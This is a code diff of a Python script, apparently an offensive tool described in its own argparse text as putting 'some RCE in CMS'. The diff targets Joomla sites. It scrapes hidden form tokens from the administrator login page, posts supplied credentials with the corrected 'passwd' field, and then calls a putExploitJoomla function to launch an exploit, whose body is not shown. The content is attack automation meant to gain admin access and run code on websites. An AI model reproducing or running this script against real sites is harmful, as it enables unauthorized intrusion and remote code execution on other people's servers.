@@ -5,9 +5,11 @@ from bs4 import BeautifulSoup
 # WORDPRESS
 
 # JOOMLA
+
+# GET HIDDEN VALUES FROM /index.php IN JOOMLA
 def getHiddenValues(url):
     
-    response = requests.get(f"{url}/index.php")
+    response = requests.get(f"{url}/administrator/index.php")
     
     if response.status_code == 200:
         soup = BeautifulSoup(response.content, 'html.parser')
@@ -32,12 +34,12 @@ def getHiddenValues(url):
         print(f"Error: {url} Status code: {response.status_code}")
         return {}    
 
-
+# LOGIN JOOMLA
 def postLoginJoomla(user, password, url, hidden_values):
     
     data = {
         'username': user,
-        'password': password,
+        'passwd': password,
         'Submit=': '',
         'option': hidden_values.get('option', ''),
         'task': hidden_values.get('task', ''),
@@ -45,9 +47,16 @@ def postLoginJoomla(user, password, url, hidden_values):
         hidden_values.get('1', ''): '1'
     }
     
-    response = requests.post(url, data, allow_redirects=True)
+    host = (f"{url}/administrator/index.php")
+    
+    response = requests.post(host, data, allow_redirects=True)
+    print(response.request)
+    # Debug
+    print("[+] Start login into admin")
     print(f'[+] {data}')
     print(f'[+] Status code: {response.status_code}')
+    # Lunch
+    putExploitJoomla(url)
 
 def main():
     parser = argparse.ArgumentParser(description='Jumbo loves to put some RCE in CMS')
